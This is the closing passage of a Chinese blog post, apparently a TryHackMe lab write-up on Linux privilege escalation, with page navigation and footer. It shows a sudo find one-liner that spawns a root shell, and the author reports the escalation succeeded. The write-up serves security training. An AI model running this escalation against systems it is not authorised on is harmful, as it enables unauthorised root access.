+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su missy </span><br><span class="line">密码 </span><br><span class="line">登录上后sudo -l看一下能执行哪些命令</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/28/BQONsHTvh48G6i1.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find命令可以直接提 </span><br><span class="line">sudo find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/28/dywCfgoLnsIOt83.png"><br>提权成功</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Tryhackme/" rel="tag"># Tryhackme</a>
+              <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag"># 权限提升</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/28/Metasploit/" rel="prev" title="Metasploit">
+      <i class="fa fa-chevron-left"></i> Metasploit
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/28/Windows%E6%8F%90%E6%9D%83/" rel="next" title="Windows提权">
+      Windows提权 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">1.</span> <span class="nav-text">常用命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ps%E5%91%BD%E4%BB%A4"><span class="nav-number">2.</span> <span class="nav-text">ps命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#find%E5%91%BD%E4%BB%A4"><span class="nav-number">3.</span> <span class="nav-text">find命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%87%AA%E5%8A%A8%E6%8F%90%E6%9D%83%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7"><span class="nav-number">4.</span> <span class="nav-text">自动提权枚举工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sudo-l"><span class="nav-number">5.</span> <span class="nav-text">sudo -l</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LD-PRELOAD-%E6%BB%A5%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">LD_PRELOAD 滥用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Capabilities"><span class="nav-number">7.</span> <span class="nav-text">Capabilities</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="nav-number">8.</span> <span class="nav-text">计划任务提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PATH%E6%8F%90%E6%9D%83"><span class="nav-number">9.</span> <span class="nav-text">PATH提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NFS%E6%8F%90%E6%9D%83"><span class="nav-number">10.</span> <span class="nav-text">NFS提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0"><span class="nav-number">11.</span> <span class="nav-text">综合练习</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lu1i丶"
+      src="/images/1.PNG">
+  <p class="site-author-name" itemprop="name">Lu1i丶</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lu1i丶</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
